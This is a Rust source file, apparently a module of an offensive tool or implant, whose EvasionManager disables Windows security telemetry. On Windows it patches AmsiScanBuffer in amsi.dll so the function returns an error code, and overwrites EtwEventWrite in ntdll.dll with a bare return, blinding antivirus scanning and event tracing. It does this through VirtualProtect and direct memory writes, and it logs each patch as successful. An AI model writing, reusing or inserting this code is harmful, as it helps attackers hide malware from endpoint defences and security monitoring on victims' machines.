use tracing::info;

#[cfg(target_os = "windows")]
use tracing::warn;

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, GetModuleHandleA};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

pub struct EvasionManager;

impl EvasionManager {
    pub fn apply_evasion_hooks() {
        #[cfg(target_os = "windows")]
        {
            info!("Applying Windows evasion hooks (AMSI/ETW patching)...");
            Self::patch_amsi();
            Self::patch_etw();
        }
        #[cfg(not(target_os = "windows"))]
        {
            info!("No evasion hooks required for this platform.");
        }
    }

    #[cfg(target_os = "windows")]
    fn patch_amsi() {
        unsafe {
            let amsi_dll = GetModuleHandleA("amsi.dll\0".as_ptr());
            if amsi_dll == 0 {
                warn!("amsi.dll not found, skipping patch");
                return;
            }

            let amsi_scan_buffer = GetProcAddress(amsi_dll, "AmsiScanBuffer\0".as_ptr());
            if let Some(addr) = amsi_scan_buffer {
                // x64 patch: b8 57 00 07 80 c3 (mov eax, 0x80070057; ret)
                let patch = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
                let mut old_protect = 0u32;
                
                if VirtualProtect(addr as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) != 0 {
                    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());
                    VirtualProtect(addr as _, patch.len(), old_protect, &mut old_protect);
                    info!("AMSI patched successfully.");
                } else {
                    warn!("Failed to change memory protection for AMSI patch");
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    fn patch_etw() {
        unsafe {
            let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr());
            if ntdll == 0 {
                warn!("ntdll.dll not found, skipping ETW patch");
                return;
            }

            let etw_event_write = GetProcAddress(ntdll, "EtwEventWrite\0".as_ptr());
            if let Some(addr) = etw_event_write {
                // x64 patch: c3 (ret)
                let patch = [0xC3];
                let mut old_protect = 0u32;

                if VirtualProtect(addr as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) != 0 {
                    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());
                    VirtualProtect(addr as _, patch.len(), old_protect, &mut old_protect);
                    info!("ETW patched successfully.");
                } else {
                    warn!("Failed to change memory protection for ETW patch");
                }
            }
        }
    }
}
